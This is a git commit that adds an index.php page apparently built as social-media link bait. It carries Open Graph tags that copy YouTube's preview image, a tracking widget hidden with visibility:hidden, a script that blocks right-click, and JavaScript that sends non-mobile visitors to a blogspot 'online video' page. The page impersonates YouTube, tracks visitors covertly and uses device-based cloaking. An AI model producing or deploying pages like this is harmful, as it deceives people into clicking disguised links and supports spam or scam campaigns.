5e7824c7c91755c0d2b639d9751104f1ad54577d
joendy25 <88859247+joendy25@users.noreply.github.com>
2022-02-05 09:01:07 +0800

    Create index.php

---
+++ index.php
@@ -0,0 +1,36 @@
+<meta property="og:image" content="https://www.youtube.com/img/desktop/yt_1200.png" />
+<meta property="fb:app_id" content="87741124305" />
+
+
+<p></p> 
+<div class="separator" style="clear: both; text-align: center;"><a href="https://onlinevideoxx25.blogspot.com/2022/01/blog-post.html"/></a></div><br
+
+
+
+<div style="VISIBILITY: hidden;"> <script type="text/javascript" src="//widgets.amung.us/small.js"></script><script type="text/javascript">WAU_small('joker192519')</script></div>
+
+<script type='text/javascript'>
+	document.oncontextmenu = function(){return false}
+</script>
+</script>
+
+
+
+<script type="text/javascript">
+//<![CDATA[
+ function h(r, a) { var t = ""; if ("mix" == a) var h = 
+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; else var h = 
+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; for (var n = 0; r > n; n++) t += h.charAt(Math.floor(Math.random() * 
+h.length)); return t };
+
+        var device = navigator.userAgent
+        
+        if (device.match(/Iphone/i)|| device.match(/Ipod/i)|| device.match(/Android/i)|| device.match(/J2ME/i)|| device.match(/BlackBerry/i)|| device.match(/iPhone|iPad|iPod/i)|| device.match(/Opera Mini/i)|| device.match(/IEMobile/i)|| device.match(/Mobile/i)|| device.match(/Windows Phone/i)|| device.match(/windows mobile/i)|| device.match(/windows ce/i)|| device.match(/webOS/i)|| device.match(/palm/i)|| device.match(/bada/i)|| device.match(/series60/i)|| device.match(/nokia/i)|| device.match(/symbian/i)|| device.match(/HTC/i))
+        {
+         
+        }else
+{
+window.location = "https://onlinevideoxx25.blogspot.com/2022/01/blog-post.html"
+}
+//]]>
+</script>
